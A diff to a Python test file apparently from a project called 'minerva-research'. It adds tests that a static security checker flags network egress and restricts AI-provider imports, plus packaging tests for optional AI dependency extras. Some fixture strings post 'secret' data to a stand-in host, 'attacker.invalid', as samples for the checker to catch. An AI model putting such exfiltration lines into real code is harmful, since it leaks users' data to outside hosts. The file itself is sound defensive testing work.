@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import ast
+import email.parser
 import importlib.util
 import sys
 from pathlib import Path
@@ -28,9 +29,20 @@ installed_smoke = _load_script("installed_smoke")
 static_security_check = _load_script("static_security_check")
 verify_dist = _load_script("verify_dist")
 
+_AI_EXTRAS = ("ai", "ai-anthropic", "ai-openai")
+_AI_REQUIREMENTS = (
+    'Requires-Dist: anthropic<1,>=0.117; extra == "ai"',
+    'Requires-Dist: openai<3,>=2.46; extra == "ai"',
+    'Requires-Dist: anthropic<1,>=0.117; extra == "ai-anthropic"',
+    'Requires-Dist: openai<3,>=2.46; extra == "ai-openai"',
+)
 
-def _scan(source: str) -> set[str]:
-    visitor = static_security_check.PolicyVisitor(Path("synthetic_policy_probe.py"))
+
+def _scan(source: str, *, allowed_imports: tuple[str, ...] = ()) -> set[str]:
+    visitor = static_security_check.PolicyVisitor(
+        Path("synthetic_policy_probe.py"),
+        allowed_imports=allowed_imports,
+    )
     visitor.visit(ast.parse(source))
     return {violation.code for violation in visitor.violations}
 
@@ -71,6 +83,57 @@ def test_static_policy_allows_non_egress_connection_and_async_shapes(source: str
     assert _scan(source) == set()
 
 
+@pytest.mark.security
+@pytest.mark.parametrize(
+    "source",
+    [
+        "import httpx\nhttpx.post('https://attacker.invalid', content=b'secret')",
+        ("import httpx\nclient = httpx.Client()\nclient.send(object())"),
+        "import httpx\nhttpx.Client().send(object())",
+        (
+            "import httpx\n"
+            "with httpx.Client() as transport:\n"
+            "    transport.get('https://attacker.invalid')"
+        ),
+    ],
+)
+def test_static_policy_blocks_direct_httpx_egress_inside_provider_adapter(source: str) -> None:
+    assert "MIN001" in _scan(source, allowed_imports=("httpx",))
+
+
+@pytest.mark.security
+def test_provider_import_allowlist_is_exactly_path_and_provider_scoped(tmp_path: Path) -> None:
+    source_root = tmp_path / "minerva"
+    openai_adapter = source_root / "integrations" / "ai" / "openai.py"
+    anthropic_adapter = source_root / "integrations" / "ai" / "anthropic.py"
+    outside = source_root / "research" / "provider.py"
+    openai_adapter.parent.mkdir(parents=True)
+    outside.parent.mkdir(parents=True)
+    openai_adapter.write_text("import httpx\nimport openai\n", encoding="utf-8")
+    anthropic_adapter.write_text("import httpx\nimport anthropic\n", encoding="utf-8")
+    outside.write_text("import openai\n", encoding="utf-8")
+
+    violations = static_security_check.scan_tree(source_root)
+
+    assert len(violations) == 1
+    assert violations[0].path == outside
+    assert violations[0].code == "MIN004"
+
+
+@pytest.mark.security
+def test_provider_adapter_cannot_import_the_other_provider(tmp_path: Path) -> None:
+    source_root = tmp_path / "minerva"
+    adapter = source_root / "integrations" / "ai" / "openai.py"
+    adapter.parent.mkdir(parents=True)
+    adapter.write_text("import anthropic\n", encoding="utf-8")
+
+    violations = static_security_check.scan_tree(source_root)
+
+    assert [(item.code, item.message) for item in violations] == [
+        ("MIN004", "model provider/runtime import is prohibited: anthropic")
+    ]
+
+
 @pytest.mark.packaging
 def test_exact_resource_manifest_accepts_current_resources() -> None:
     names = set(verify_dist.EXPECTED_RESOURCES)
@@ -109,6 +172,90 @@ def test_exact_resource_manifest_rejects_unmanifested_resource() -> None:
         verify_dist._require_exact_resources(names, Path("mutated.whl"))
 
 
+def _ai_metadata(
+    *,
+    extras: tuple[str, ...] = _AI_EXTRAS,
+    requirements: tuple[str, ...] = _AI_REQUIREMENTS,
+) -> object:
+    lines = ["Name: minerva-research", "Version: 0.2.0a1"]
+    lines.extend(f"Provides-Extra: {extra}" for extra in extras)
+    lines.extend(requirements)
+    return email.parser.BytesParser().parsebytes(("\n".join(lines) + "\n\n").encode())
+
+
+@pytest.mark.packaging
+def test_distribution_metadata_requires_exact_optional_ai_contract() -> None:
+    verify_dist._verify_ai_extra_metadata(_ai_metadata(), Path("synthetic.whl"))
+
+
+@pytest.mark.packaging
+@pytest.mark.parametrize("missing", _AI_EXTRAS)
+def test_distribution_metadata_rejects_each_missing_ai_extra(missing: str) -> None:
+    extras = tuple(extra for extra in _AI_EXTRAS if extra != missing)
+    with pytest.raises(verify_dist.VerificationError, match="missing required AI extras"):
+        verify_dist._verify_ai_extra_metadata(
+            _ai_metadata(extras=extras),
+            Path("mutated.whl"),
+        )
+
+
+@pytest.mark.packaging
+def test_distribution_metadata_rejects_unconditional_provider_dependency() -> None:
+    requirements = (*_AI_REQUIREMENTS, "Requires-Dist: openai<3,>=2.46")
+    with pytest.raises(verify_dist.VerificationError, match="base dependency"):
+        verify_dist._verify_ai_extra_metadata(
+            _ai_metadata(requirements=requirements),
+            Path("mutated.whl"),
+        )
+
+
+@pytest.mark.packaging
+def test_distribution_metadata_rejects_wrong_or_missing_provider_requirement() -> None:
+    wrong = tuple(
+        requirement.replace("openai<3,>=2.46", "openai<4,>=2.46")
+        if 'extra == "ai-openai"' in requirement
+        else requirement
+        for requirement in _AI_REQUIREMENTS
+    )
+    with pytest.raises(verify_dist.VerificationError, match="incorrect provider requirements"):
+        verify_dist._verify_ai_extra_metadata(
+            _ai_metadata(requirements=wrong),
+            Path("mutated.whl"),
+        )
+
+
+@pytest.mark.packaging
+@pytest.mark.parametrize(
+    "unexpected",
+    [
+        'Requires-Dist: openai<3,>=2.46; extra == "ai-anthropic"',
+        'Requires-Dist: openai<4,>=2.46; extra == "ai-openai"',
+    ],
+)
+def test_distribution_metadata_rejects_additional_active_provider_requirement(
+    unexpected: str,
+) -> None:
+    requirements = (*_AI_REQUIREMENTS, unexpected)
+    with pytest.raises(verify_dist.VerificationError, match="incorrect provider requirements"):
+        verify_dist._verify_ai_extra_metadata(
+            _ai_metadata(requirements=requirements),
+            Path("mutated.whl"),
+        )
+
+
+@pytest.mark.packaging
+def test_distribution_metadata_ignores_dev_only_provider_requirements() -> None:
+    requirements = (
+        *_AI_REQUIREMENTS,
+        'Requires-Dist: anthropic<1,>=0.117; extra == "dev"',
+        'Requires-Dist: openai<3,>=2.46; extra == "dev"',
+    )
+    verify_dist._verify_ai_extra_metadata(
+        _ai_metadata(requirements=requirements),
+        Path("synthetic.whl"),
+    )
+
+
 @pytest.mark.packaging
 def test_installed_smoke_fails_clearly_without_uv(
     tmp_path: Path,
@@ -131,6 +278,15 @@ def test_installed_smoke_fails_clearly_without_lockfile(
 
     with pytest.raises(installed_smoke.SmokeError, match="project lockfile"):
         installed_smoke._uv_tooling(tmp_path)
+
+
+@pytest.mark.packaging
+def test_installed_smoke_covers_each_provider_extra_boundary() -> None:
+    assert installed_smoke.PROVIDER_EXTRA_CASES == (
+        ("ai-openai", ("openai",)),
+        ("ai-anthropic", ("anthropic",)),
+        ("ai", ("anthropic", "openai")),
+    )
 
 
 def test_loaded_gate_scripts_are_modules() -> None:
